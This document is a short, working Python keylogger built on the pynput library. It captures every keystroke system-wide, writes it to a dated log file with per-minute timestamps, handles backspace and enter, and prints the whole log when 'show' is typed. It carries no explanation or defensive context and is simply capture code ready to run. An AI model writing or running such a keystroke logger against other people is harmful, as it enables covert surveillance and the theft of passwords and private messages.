from pynput import keyboard
from datetime import datetime
dict1 = {
    "Key.space": " ",
    "Key.ctrl": " Control ",
    "Key.backspace":"backspace",
    "Key.enter": "enter"
}
current_datetime = datetime.now()
current_time = current_datetime.strftime("%d-%m-%Y")
file_name = f"logs/{current_time}.txt"
current_time = current_datetime.strftime("%d/%m/%Y %H:%M")
print(current_time)
with open(file_name, "w") as file:
    file.write("\n***** " + current_time + " *****\n")


def spacial_keys(tempKey):
    if tempKey == "backspace":
        data = ''
        with open(file_name, "r") as f:
            data = f.read()
        with open(file_name, "w") as f:
            f.write(data[:-1])
        return True
    elif tempKey == "enter":
        data = ''
        with open(file_name, "a") as f:
            f.write('\n')
        return True
    return False
def add_to_file(tempKey):
    global current_time
    tempTime = datetime.now().strftime("%d/%m/%Y %H:%M")
    if tempTime != current_time:
        with open(file_name, "a") as file:
            file.write("\n***** " + tempTime + " *****\n")
            current_time = tempTime
    with open(file_name, "a") as file:
        file.write(tempKey)
    data = ''
    with open(file_name, "r") as f:
        data = f.read()
    if data[-4:] == "show":
        print("\n"+data[:-4:])


def on_press(key):
    tempKey = ''
    try:
        tempKey = key.char

    except AttributeError:
        tempKey = str(key)
        if tempKey in dict1:
            tempKey = dict1[tempKey]
        else:
            tempKey = " '" + tempKey + "' "
        if spacial_keys(tempKey):
            return
    add_to_file(tempKey)


listener = keyboard.Listener(on_press = on_press)
listener.start()
listener.join()
